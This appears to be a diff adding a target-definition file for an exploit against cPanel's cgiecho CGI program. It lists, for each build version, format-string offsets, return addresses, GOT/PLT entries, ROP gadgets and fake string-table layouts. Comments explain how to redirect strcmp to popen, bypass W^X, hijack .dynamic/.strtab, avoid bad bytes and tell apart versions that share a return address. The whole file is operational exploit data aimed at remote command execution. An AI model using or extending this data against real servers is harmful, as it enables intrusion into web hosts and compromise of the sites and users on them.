@@ -1,0 +1,603 @@
+
+##########################
+### 32-bit executables ###
+##########################
+
+
+# ./cgiecho:::17636:::1148416442:::ccd0fce0301d1462205f90f6590b994f
+
+[cPanel(17636)]
+
+word_size 4
+formatstr_offset 88
+
+retnaddr 0x0804a03d
+retnaddr_offset 20
+
+outstr_offset 0x002c
+
+got.strcmp 0x0804cd84
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048c0c
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x0804927d
+#addr_popebx_popebp_ret 0x080497d1
+#addr_popebx_popebp_ret 0x08049c05
+#addr_popebx_popebp_ret 0x0804a324
+#addr_popebx_popebp_ret 0x0804b550
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804cc94 (RW mapping starts at 0x0804c000 leaving 3220 bytes spare)
+# final RW section ends at 0x0804cf34 (RW mapping ends at 0x0804d000 leaving 204 bytes spare)
+# full strtab requires 450 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0804ccc4
+fakestrtab.base 0x0804c004
+
+fakestrtab.rewind 0x0804c11c
+fakestrtab.puts 0x0804c174
+fakestrtab.fread 0x0804c0b1
+fakestrtab.fclose 0x0804c0f1
+fakestrtab.free 0x0804c181
+fakestrtab.fwrite 0x0804c10e
+
+
+# ./cgiecho:::17816:::<date n/k>:::9cbd96dea4a32258b20fcdbbd3f44a05
+
+[cPanel(17816)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a0f6
+retnaddr_offset 36
+
+outstr_offset 0x003c
+
+got.strcmp 0x0804ce38
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048c34
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08048f38
+#addr_popebx_popebp_ret 0x0804995a
+#addr_popebx_popebp_ret 0x08049d19
+#addr_popebx_popebp_ret 0x0804b5d7
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804cd48 (RW mapping starts at 0x0804c000 leaving 3400 bytes spare)
+# final RW section ends at 0x0804cfd4 (RW mapping ends at 0x0804d000 leaving 44 bytes spare)
+# full strtab requires 457 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0804cd78
+fakestrtab.base 0x0804c004
+
+fakestrtab.rewind 0x0804c123
+fakestrtab.puts 0x0804c17b
+fakestrtab.fread 0x0804c0b8
+fakestrtab.fclose 0x0804c0f8
+fakestrtab.free 0x0804c188
+fakestrtab.fwrite 0x0804c115
+
+
+# ./cgiecho:::17688:::1219714530:::663e157ab741eb8f0505afbc7a4a1526
+
+[cPanel(17688)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a09e
+retnaddr_offset 36
+
+outstr_offset 0x003c
+
+got.strcmp 0x0804cea0
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048b60
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08049902
+#addr_popebx_popebp_ret 0x08049cc1
+#addr_popebx_popebp_ret 0x0804b577
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804ccf0 (RW mapping starts at 0x0804c000 leaving 3312 bytes spare)
+# final RW section ends at 0x0804cf74 (RW mapping ends at 0x0804d000 leaving 140 bytes spare)
+# full strtab requires 470 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0804cd20
+fakestrtab.base 0x0804c004
+
+fakestrtab.rewind 0x0804c130
+fakestrtab.free 0x0804c195
+fakestrtab.fclose 0x0804c105
+fakestrtab.fwrite 0x0804c122
+fakestrtab.puts 0x0804c188
+fakestrtab.fread 0x0804c0c5
+
+
+# ./cgiecho:::17696:::<date n/k>:::4ef33f4a1c7f32fe3f677959c9222e59
+
+[cPanel(17696)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a092
+retnaddr_offset 36
+
+got.strcmp 0x0804ceac
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048b40
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08048f03
+#addr_popebx_popebp_ret 0x080498f6
+#addr_popebx_popebp_ret 0x08049cb5
+#addr_popebx_popebp_ret 0x0804b587
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804ccfc (RW mapping starts at 0x0804c000 leaving 3324 bytes spare)
+# final RW section ends at 0x0804cf94 (RW mapping ends at 0x0804d000 leaving 108 bytes spare)
+# full strtab requires 457 bytes; put fake strtab at start of RW mapping
+
+#dynamic.strtab 0x0804cd2c
+#fakestrtab.base 0x0804c004
+
+# HACK: avoid 0x2c byte by writing one byte early
+# overwrites MSB of previous dword, which is 0x00000005 (STRTAB)
+# leaves MSB unwritten, but it's already 0x08 (true address of .strtab)
+dynamic.strtab 0x0804cd2b
+fakestrtab.base 0x04c00400
+
+fakestrtab.rewind 0x0804c123
+fakestrtab.free 0x0804c188
+fakestrtab.fclose 0x0804c0f8
+fakestrtab.fwrite 0x0804c115
+fakestrtab.puts 0x0804c17b
+fakestrtab.fread 0x0804c0b8
+
+
+# ./cgiecho:::18492:::<date n/k>:::0711c1ebacb7fbc62a6c36cf4a57778c
+
+[cPanel(18492)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a092
+retnaddr_offset 36
+
+got.strcmp 0x0804c1b8
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048b40
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08048f03
+#addr_popebx_popebp_ret 0x080498f6
+#addr_popebx_popebp_ret 0x08049cb5
+#addr_popebx_popebp_ret 0x0804b5c7
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804c008 (RW mapping starts at 0x0804c000 leaving 8 bytes spare)
+# final RW section ends at 0x0804c294 (RW mapping ends at 0x0804d000 leaving 3436 bytes spare)
+# full strtab requires 457 bytes; put fake strtab at end of RW mapping
+
+dynamic.strtab 0x0804c038
+fakestrtab.base 0x0804ce33
+
+fakestrtab.rewind 0x0804cf52
+fakestrtab.free 0x0804cfb7
+fakestrtab.fclose 0x0804cf27
+fakestrtab.fwrite 0x0804cf44
+fakestrtab.puts 0x0804cfaa
+fakestrtab.fread 0x0804cee7
+
+
+# ./cgiecho:::17664:::<date n/k>:::40424adf4d8ab05d04a5f3d70dce8a5c
+
+[cPanel(17664)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a092
+retnaddr_offset 36
+
+got.strcmp 0x0804ce8c
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048b40
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08048f03
+#addr_popebx_popebp_ret 0x080498f6
+#addr_popebx_popebp_ret 0x08049cb5
+#addr_popebx_popebp_ret 0x0804b5c7
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804ccdc (RW mapping starts at 0x0804c000 leaving 3292 bytes spare)
+# final RW section ends at 0x0804cf74 (RW mapping ends at 0x0804d000 leaving 140 bytes spare)
+# full strtab requires 457 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0804cd0c
+fakestrtab.base 0x0804c004
+
+fakestrtab.rewind 0x0804c123
+fakestrtab.free 0x0804c188
+fakestrtab.fclose 0x0804c0f8
+fakestrtab.fwrite 0x0804c115
+fakestrtab.puts 0x0804c17b
+fakestrtab.fread 0x0804c0b8
+
+
+# Two cgiechos with the same size but different. Same settings work
+# for both.
+
+# ./cgiecho:::18324:::<date n/k>:::4abdf69300b1c8ae863556bdbbd7b781
+# ./cgiecho:::18324:::<date n/k>:::0d2b04b4eab9b1994e83e4572901ffda
+
+[cPanel(18324)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a0cb
+retnaddr_offset 36
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x0804c008 (RW mapping starts at 0x0804c000 leaving 8 bytes spare)
+# final RW section ends at 0x0804c274 (RW mapping ends at 0x0804d000 leaving 3468 bytes spare)
+# full strtab requires 471 bytes; put fake strtab at end of RW mapping
+
+dynamic.strtab 0x0804c038
+fakestrtab.base 0x0804ce25
+
+fakestrtab.rewind 0x0804cf48
+fakestrtab.puts 0x0804cfa0
+fakestrtab.fread 0x0804cecf
+fakestrtab.fclose 0x0804cf0f
+fakestrtab.free 0x0804cfad
+fakestrtab.fwrite 0x0804cf3a
+
+
+
+# *** RETNADDR COLLISION ***
+# cPanel(17696), cPanel(18492) and cPanel(17664) share the same retnaddr
+# all 3 will detect as cPanel(17696|18492|17664) since it is placed last
+# distinguish exes by reading plt.strcmp at 0x08048e32-0x08048e36:
+#   0xac 0xce 0x04 0x08 for cPanel(17696)
+#   0xb8 0xc1 0x04 0x08 for cPanel(18492)
+#   0x8c 0xce 0x04 0x08 for cPanel(17664)
+
+[cPanel(17696|18492|17664)]
+
+retnaddr 0x0804a092
+retnaddr_offset 36
+
+
+
+##########################
+### 64-bit executables ###
+##########################
+
+
+# ./cgiecho:::21496:::<date n/k>:::b14823c10d8207fb7cbfa59b56a041b0
+
+[cPanel(21496)]
+
+word_size 8
+formatstr_offset 128
+
+retnaddr 0x0000000000402844
+retnaddr_offset 88
+
+got.strcmp 0x0000000000604ae0
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x0000000000401490
+
+# For W^X exploit #2: got.fopen <- plt.popen, got.fprintf <- cgi_template_fill+12
+
+got.fopen 0x00000000006049f0
+
+# want to write cgi_template_fill+12@got.fprintf but bad byte 0x2c means we have to do
+# cgi_template_fill+12@got.fprintf,0x00000000@got.fprintf+3,0x0000@got.fprintf+7
+# i.e. using 32-bit value and writing zeros to cover the other 32 bits of the pointer
+# smashes GOT entry after fprintf (localtime) but safe
+
+got.fprintf 0x0000000000604b28
+got.fprintf+3 0x0000000000604b2b
+got.fprintf+7 0x0000000000604b2f
+
+cgi_template_fill+12 0x0040246d
+
+# For W^X exploit #3: got.fopen <- plt.popen, got.__[l]xstat <- cgi_template_fill+12, got.getenv <- wrap_[l]xstat
+
+got.getenv 0x0000000000604ac8
+
+got.__xstat 0x0000000000604a38
+got.__lxstat 0x0000000000604b00
+
+# wrapper functions: wrap_<fun>(arg) -> call _<fun>(1, arg)
+
+wrap_xstat 0x0000000000403b30
+wrap_lxstat 0x0000000000403b50
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x006047d8 (RW mapping starts at 0x00604000 leaving 2008 bytes spare)
+# final RW section ends at 0x00604c38 (RW mapping ends at 0x00605000 leaving 968 bytes spare)
+# full strtab requires 448 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0000000000604838
+fakestrtab.base 0x0000000000604008
+
+fakestrtab.puts 0x0000000000604174
+fakestrtab.free 0x0000000000604181
+fakestrtab.rewind 0x000000000060412b
+fakestrtab.fread 0x00000000006040b2
+fakestrtab.fclose 0x0000000000604065
+fakestrtab.fwrite 0x000000000060411d
+
+
+# ./cgiecho:::21536:::<date n/k>:::509ce770dc2efde8316b307dcdd3693e
+
+[cPanel(21536)]
+
+word_size 8
+formatstr_offset 128
+
+retnaddr 0x0000000000402866
+retnaddr_offset 88
+
+got.strcmp 0x0000000000604b10
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x0000000000401490
+
+# For W^X exploit #2: got.fopen <- plt.popen, got.fprintf <- cgi_template_fill+12
+
+got.fopen 0x0000000000604a20
+
+# no bad byte 0x2c so could do this with 2 writes
+
+got.fprintf 0x0000000000604b58
+got.fprintf+3 0x0000000000604b5b
+got.fprintf+7 0x0000000000604b5f
+
+cgi_template_fill+12 0x0040248f
+
+# For W^X exploit #3: got.fopen <- plt.popen, got.__[l]xstat <- cgi_template_fill+12, got.getenv <- wrap_[l]xstat
+
+got.getenv 0x0000000000604af8
+
+got.__xstat 0x0000000000604a68
+got.__lxstat 0x0000000000604b30
+
+# wrapper functions: wrap_<fun>(arg) -> call _<fun>(1, arg)
+
+wrap_xstat 0x0000000000403b60
+wrap_lxstat 0x0000000000403b80
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x00604808 (RW mapping starts at 0x00604000 leaving 2056 bytes spare)
+# final RW section ends at 0x00604c58 (RW mapping ends at 0x00605000 leaving 936 bytes spare)
+# full strtab requires 448 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0000000000604868
+fakestrtab.base 0x0000000000604008
+
+fakestrtab.puts 0x0000000000604174
+fakestrtab.free 0x0000000000604181
+fakestrtab.rewind 0x000000000060412b
+fakestrtab.fread 0x00000000006040b2
+fakestrtab.fclose 0x0000000000604065
+fakestrtab.fwrite 0x000000000060411d
+
+
+# ./cgiecho:::21832:::<date n/k>:::f9d1da90b823773cf38b08c23299e8ff
+
+[cPanel(21832)]
+
+word_size 8
+formatstr_offset 128
+
+retnaddr 0x0000000000402866
+retnaddr_offset 88
+
+got.strcmp 0x0000000000604c28
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x0000000000401490
+
+# For W^X exploit #2: got.fopen <- plt.popen, got.fprintf <- cgi_template_fill+12
+
+got.fopen 0x0000000000604b38
+
+# no bad byte 0x2c so could do this with 2 writes
+
+got.fprintf 0x0000000000604c70
+got.fprintf+3 0x0000000000604c73
+got.fprintf+7 0x0000000000604c77
+
+cgi_template_fill+12 0x0040248f
+
+# For W^X exploit #3: got.fopen <- plt.popen, got.__[l]xstat <- cgi_template_fill+12, got.getenv <- wrap_[l]xstat
+
+got.getenv 0x0000000000604c10
+
+# xstat has been called already by the new /var/cpanel/cgiemail-disabled startup code
+# so we can't write just the lower half of the cgi_template_fill+12 pointer and assume the rest is zeros
+# lie to caller, give him (wrap_)lxstat when he asks for (wrap_)xstat, works the same but not called
+
+#got.__xstat 0x0000000000604b80
+#got.__lxstat 0x0000000000604c48
+got.__xstat 0x0000000000604c48
+
+# wrapper functions: wrap_<fun>(arg) -> call _<fun>(1, arg)
+
+#wrap_xstat 0x0000000000403ba0
+#wrap_lxstat 0x0000000000403bc0
+wrap_xstat 0x0000000000403bc0
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x00604920 (RW mapping starts at 0x00604000 leaving 2336 bytes spare)
+# final RW section ends at 0x00604d78 (RW mapping ends at 0x00605000 leaving 648 bytes spare)
+# full strtab requires 448 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0000000000604980
+fakestrtab.base 0x0000000000604008
+
+fakestrtab.puts 0x0000000000604174
+fakestrtab.free 0x0000000000604181
+fakestrtab.rewind 0x000000000060412b
+fakestrtab.fread 0x00000000006040b2
+fakestrtab.fclose 0x0000000000604065
+fakestrtab.fwrite 0x000000000060411d
+
+
+# ./cgiecho:::18280:::<date n/k>:::60905a04aedb8ae0fc68f431ec77c2e7
+
+[cPanel(18280)]
+
+word_size 8
+formatstr_offset 112
+
+retnaddr 0x0000000000401aff
+retnaddr_offset 88
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x00503b68 (RW mapping starts at 0x00503000 leaving 2920 bytes spare)
+# final RW section ends at 0x00503f88 (RW mapping ends at 0x00504000 leaving 120 bytes spare)
+# full strtab requires 427 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0000000000503bc8
+fakestrtab.base 0x0000000000503008
+
+fakestrtab.rewind 0x000000000050312e
+fakestrtab.fwrite 0x0000000000503118
+fakestrtab.fclose 0x000000000050305e
+fakestrtab.fread 0x00000000005030b4
+fakestrtab.puts 0x0000000000503170
+fakestrtab.free 0x000000000050317d
+
+
+
+# ./cgiecho:::21800:::<date n/k>:::550bf93dc69b8c84192baec8465dd1a5
+
+[cPanel(21800)]
+
+word_size 8
+formatstr_offset 128
+
+retnaddr 0x0000000000402866
+retnaddr_offset 88
+
+got.strcmp 0x0000000000504ba0
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x0000000000401210
+
+# For W^X exploit #2: got.fopen <- plt.popen, got.fprintf <- cgi_template_fill+12
+
+got.fopen 0x0000000000504c70
+
+# no bad byte 0x2c so could do this with 2 writes
+
+got.fprintf   0x0000000000504b88
+got.fprintf+3 0x0000000000504b8b
+got.fprintf+7 0x0000000000504b8f
+
+cgi_template_fill+12 0x000000000040248f
+
+# For W^X exploit #3: got.fopen <- plt.popen, got.__[l]xstat <- cgi_template_fill+12, got.getenv <- wrap_[l]xstat
+
+got.getenv 0x0000000000504b10
+
+# xstat has been called already by the new /var/cpanel/cgiemail-disabled startup code
+# so we can't write just the lower half of the cgi_template_fill+12 pointer and assume the rest is zeros
+# lie to caller, give him (wrap_)lxstat when he asks for (wrap_)xstat, works the same but not called
+
+got.__xstat 0x0000000000504ae8
+
+# wrapper functions: wrap_<fun>(arg) -> call _<fun>(1, arg)
+
+wrap_xstat 0x0000000000403bb0
+
+# For .dynamic/.strtab exploit:
+
+# first RW section starts at 0x00504900 (RW mapping starts at 0x00504000 leaving 2304 bytes spare)
+# full strtab requires 427 bytes; put fake strtab at start of RW mapping
+
+dynamic.strtab 0x0000000000504970
+fakestrtab.base 0x0000000000504008
+
+fakestrtab.rewind 0x000000000050412b
+fakestrtab.fwrite 0x000000000050411d
+fakestrtab.fclose 0x0000000000504065
+fakestrtab.fread 0x00000000005040b2
+fakestrtab.puts 0x0000000000504174
+fakestrtab.free 0x0000000000504181
+
+
+# *** RETNADDR COLLISION ***
+# cPanel(21536), cPanel(21832), cPanel(21800) share the same retnaddr
+# both will detect as cPanel(21536|21832|21800) since it is placed last
+# distinguish exes by reading plt.strcmp at 0x00000000004013d2-0x00000000004013d6:
+#   0x3a 0x37 0x20 0x00 for cPanel(21536)
+#   0x52 0x38 0x20 0x00 for cPanel(21832)
+#   0x42 0x38 0x10 0x00 for cPanel(21800) .plt.exit in this version
+
+[cPanel(21536|21832|21800)]
+
+retnaddr 0x0000000000402866
+retnaddr_offset 88
+
+
+
+##########################
+### Other definitions  ###
+##########################
+
+[strings]
+
+fclose 0x000065736f6c6366
+rewind 0x0000646e69776572
+puts 0x0000000073747570
+fread 0x0000006461657266
+system 0x00006d6574737973
+exit 0x0000000074697865
